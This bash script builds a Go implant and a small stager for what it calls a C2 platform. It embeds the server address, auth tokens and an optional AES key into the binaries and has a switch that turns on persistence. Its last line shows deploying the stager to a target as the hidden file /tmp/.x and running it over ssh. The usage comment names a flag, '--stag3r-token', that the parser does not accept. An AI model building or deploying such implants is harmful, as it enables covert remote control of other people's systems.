#!/usr/bin/env bash
set -euo pipefail

# ---------------------------------------------------------------------------
# build-stager.sh — Build the Go implant + stager for the C2 platform
#
# Usage:
#   ./scripts/build-stager.sh                    # build both, default config
#   ./scripts/build-stager.sh --server 10.0.0.5:8443 --stag3r-token s3cr3t
#
# Produces:
#   /tmp/implant       — full implant binary (served by C2 server)
#   /tmp/stager        — tiny stager (deployed to target)
# ---------------------------------------------------------------------------

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
IMPLANT_DIR="$SCRIPT_DIR/src/c2/implant"
GOROOT="${GOROOT:-/tmp/go}"
GO="$GOROOT/bin/go"

SERVER_ADDR="${SERVER_ADDR:-localhost:8443}"
STAGER_TOKEN="${STAGER_TOKEN:-stag3r-t0k3n-change}"
IMPLANT_TOKEN="${IMPLANT_TOKEN:-$STAGER_TOKEN}"   # if separate from stager token
AES_KEY_HEX="${AES_KEY_HEX:-}"
NO_PERSIST="${NO_PERSIST:-true}"                   # pass --no-persist to implant

while [[ $# -gt 0 ]]; do
  case "$1" in
    --server)        SERVER_ADDR="$2"; shift 2 ;;
    --stager-token)  STAGER_TOKEN="$2"; shift 2 ;;
    --implant-token) IMPLANT_TOKEN="$2"; shift 2 ;;
    --aes-key)       AES_KEY_HEX="$2"; shift 2 ;;
    --persist)       NO_PERSIST="false"; shift ;;
    --goroot)        GOROOT="$2"; shift 2 ;;
    *) echo "Unknown: $1"; exit 1 ;;
  esac
done

# Build implant args string
STAGER_X="${STAGER_X:-}"

STAGER_X="$STAGER_X -X main.serverAddr=$SERVER_ADDR -X main.authToken=$STAGER_TOKEN -X main.implantToken=$IMPLANT_TOKEN"
if [ "$NO_PERSIST" = "true" ]; then
  STAGER_X="$STAGER_X -X main.noPersist=true"
fi

GO="$GOROOT/bin/go"
echo "  GOROOT: $GOROOT"
echo "  server: $SERVER_ADDR"
echo "  output: /tmp/implant (full) + /tmp/stager"

# ---------------------------------------------------------------------------
# 1. Build the full implant (served by the C2 server)
# ---------------------------------------------------------------------------
echo ""
echo "==> Building implant..."
cd "$IMPLANT_DIR"
$GO build -ldflags="-s -w" -o /tmp/implant .
echo "    $(ls -lh /tmp/implant | awk '{print $5}')  /tmp/implant"

# ---------------------------------------------------------------------------
# 2. Build the stager (dropped on target)
# ---------------------------------------------------------------------------
echo ""
echo "==> Building stager..."
cd "$IMPLANT_DIR"

XFLAGS="-s -w $STAGER_X"
if [ -n "$AES_KEY_HEX" ]; then
  XFLAGS="$XFLAGS -X main.aesKeyHex=$AES_KEY_HEX"
fi

$GO build -ldflags="$XFLAGS" -trimpath -o /tmp/stager ./stager/
echo "    $(ls -lh /tmp/stager | awk '{print $5}')  /tmp/stager"

# ---------------------------------------------------------------------------
# 3. Summary
# ---------------------------------------------------------------------------
echo ""
echo "==> Done."
echo "    C2 server:  C2_IMPLANT_PATH=/tmp/implant"
echo "              C2_STAGER_TOKEN=$STAGER_TOKEN"
echo ""
echo "    stager -> $SERVER_ADDR (token: $STAGER_TOKEN)"
echo "    implant token: $IMPLANT_TOKEN"
echo "    persist: $([ "$NO_PERSIST" = "false" ] && echo 'YES (--no-persist not set)' || echo 'NO (--no-persist)')"
echo ""
echo "    deploy:  scp /tmp/stager target:/tmp/.x && ssh target '/tmp/.x'"
